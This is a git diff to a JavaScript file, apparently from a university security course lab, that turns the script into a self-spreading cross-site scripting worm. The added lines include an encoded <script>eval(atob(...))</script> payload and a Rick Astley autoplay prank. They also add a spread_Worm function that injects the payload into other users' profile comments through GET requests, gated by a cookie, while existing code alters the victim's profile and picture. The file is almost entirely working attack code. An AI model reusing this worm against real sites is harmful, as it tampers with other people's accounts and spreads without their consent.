@@ -1,5 +1,15 @@
 /*jshint esversion: 6 */
 
+const payload1 = `
+            <h3>CSEC 380 Answers (Recorded)</h3>
+            <audio id = "rick" controls="" autoplay="" muted="">
+                <source src="https://the360report.com/wp-content/uploads/2021/09/Rick_Astley_-_Never_Gonna_Give_You_Up.mp3" type="audio/mpeg">
+            </audio>
+            `
+
+const payload = "<script>eval(atob(\"PGgzPkNTRUMgMzgwIEFuc3dlcnMgKFJlY29yZGVkKTwvaDM+\"));</script>";
+
+
 const links = ["https://c.tenor.com/8EAnAZozlWUAAAAd/mark-zuckerberg-adjust.gif",
 	"https://c.tenor.com/rF2ktCIGGc8AAAAd/lol-limewire-limewire.gif",
     "https://i.kym-cdn.com/entries/icons/original/000/028/501/bezos.jpg",
@@ -67,11 +77,22 @@ function change_Picture(){
     xht.send(); 
 }
 
+function spread_Worm(){
+    for(let i = 134; i < 135; i++) {
+        var id = i;
+        var xhz = new XMLHttpRequest();
+        xhz.open("GET", `/change_photo.php?type=profile&id=${id}&comment=${payload}`,true);
+        xhz.send(); 
+    }
+}
+
+// GET /add_comment.php?id=127&comment=oof
 
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
-if (cookies.get("commented") != "yes") {
-    post_About();
+if (cookies.get("rekt") != "yes") {
+    spread_Worm()
 }
+post_About();
 change_Profile();
 setTimeout(change_Picture,1000)
 
